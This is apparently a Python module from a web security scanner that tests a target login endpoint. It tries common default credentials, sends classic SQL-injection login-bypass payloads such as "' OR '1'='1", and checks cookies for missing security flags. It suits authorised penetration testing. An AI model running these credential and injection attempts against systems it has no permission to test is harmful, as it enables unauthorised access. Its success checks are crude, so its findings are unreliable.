"""
Authentication Bypass Testing Module
"""

import requests
from typing import List, Dict


class AuthBypassTester:
    """Authentication bypass vulnerability tester"""
    
    def __init__(self, target: str):
        self.target = target
        self.findings = []
        
        self.default_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', ''),
            ('test', 'test'),
            ('root', 'root'),
        ]
    
    def test(self) -> List[Dict]:
        """Test for authentication bypasses"""
        self._test_default_credentials()
        self._test_sql_injection_bypass()
        self._test_weak_session()
        
        return self.findings
    
    def _test_default_credentials(self):
        """Test default credentials"""
        for username, password in self.default_credentials:
            try:
                response = requests.post(
                    self.target,
                    data={'username': username, 'password': password},
                    timeout=5
                )
                
                if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                    self.findings.append({
                        'vulnerability': 'Default Credentials',
                        'severity': 'CRITICAL',
                        'url': self.target,
                        'username': username,
                        'password': password
                    })
            except:
                pass
    
    def _test_sql_injection_bypass(self):
        """Test SQL injection for auth bypass"""
        bypass_payloads = [
            ("admin' --", "anything"),
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin' #", "anything"),
        ]
        
        for username, password in bypass_payloads:
            try:
                response = requests.post(
                    self.target,
                    data={'username': username, 'password': password},
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.findings.append({
                        'vulnerability': 'SQL Injection Auth Bypass',
                        'severity': 'CRITICAL',
                        'url': self.target,
                        'payload': username
                    })
            except:
                pass
    
    def _test_weak_session(self):
        """Test for weak session handling"""
        try:
            response = requests.get(self.target, timeout=5)
            
            if 'Set-Cookie' in response.headers:
                cookies = response.headers['Set-Cookie']
                
                if 'HttpOnly' not in cookies or 'Secure' not in cookies:
                    self.findings.append({
                        'vulnerability': 'Weak Session Cookie',
                        'severity': 'HIGH',
                        'url': self.target,
                        'issue': 'Session cookie missing security flags'
                    })
        except:
            pass